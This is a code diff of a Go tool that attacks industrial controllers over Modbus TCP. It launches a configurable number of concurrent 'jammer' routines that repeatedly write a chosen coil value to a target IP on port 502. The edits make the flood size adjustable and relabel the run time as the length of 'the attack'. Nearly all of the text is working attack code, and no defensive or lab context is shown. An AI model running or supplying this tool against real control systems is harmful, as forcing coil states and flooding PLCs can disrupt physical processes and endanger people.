@@ -12,15 +12,17 @@ import (
 
 var (
 	ip_address string
+	jamming    int
+	runtime    int
 	coil       int
 	coil_val   int
-	runtime    int
 	wait       sync.WaitGroup
 )
 
 func init() {
 	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "Enter IP address to target")
-	flag.IntVar(&runtime, "runtime", 1, "How long the program will run")
+	flag.IntVar(&jamming, "jamming", 1, "Number of times the jammer routines created") //More jammer routines = stronger jamming potential
+	flag.IntVar(&runtime, "runtime", 1, "How long the attack will run")
 	flag.IntVar(&coil, "coil", 0, "The coil position you are writing to")
 	flag.IntVar(&coil_val, "coil_val", 0, "The value you are writing to the coil")
 }
@@ -46,7 +48,7 @@ func jammer(target modbus.Client, coil uint16, coil_value int) {
 
 func main() {
 	flag.Parse()
-	target := ip_address + ":502"
+	target := ip_address + ":502" //Send Modbus traffic the specified IP on the Modbus port
 	handler := modbus.NewTCPClientHandler(target)
 	handler.Timeout = 10 * time.Second
 
@@ -59,7 +61,7 @@ func main() {
 
 	client := modbus.NewClient(handler)
 
-	for i := 0; i < 500; i++ { //Generate flood of connections
+	for i := 0; i < jamming; i++ {
 		wait.Add(1)
 		go jammer(client, uint16(coil), coil_val)
 	}
@@ -74,5 +76,4 @@ func main() {
 	}()
 
 	wait.Wait()
-
 }
